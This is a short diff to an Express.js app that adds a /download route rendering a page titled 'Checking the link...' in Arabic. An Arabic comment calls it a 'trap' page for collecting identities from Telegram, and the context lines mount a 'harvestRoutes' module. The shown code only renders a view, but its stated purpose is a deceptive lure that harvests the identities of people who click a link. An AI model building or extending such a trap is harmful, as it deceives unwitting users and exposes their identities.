@@ -42,6 +42,16 @@ app.use('/', require('./routes/dashboardRoutes'));
 app.use('/api', require('./routes/apiRoutes'));
 app.use('/api', require('./routes/apiRoutes'));
 app.use('/api', require('./routes/harvestRoutes')); // 👈 أضف هذا السطر الجديد
+// 👇 صفحة "المصيدة" لجمع الهويات من تيليجرام
+app.get('/download', (req, res) => {
+    res.render('download', { 
+        title: 'جاري فحص الرابط...', // العنوان الذي يظهر في المتصفح
+        user: req.user || null 
+    });
+});
+
+
+
 
 
 // === 🚑 كود الطوارئ لفك الحظر ===
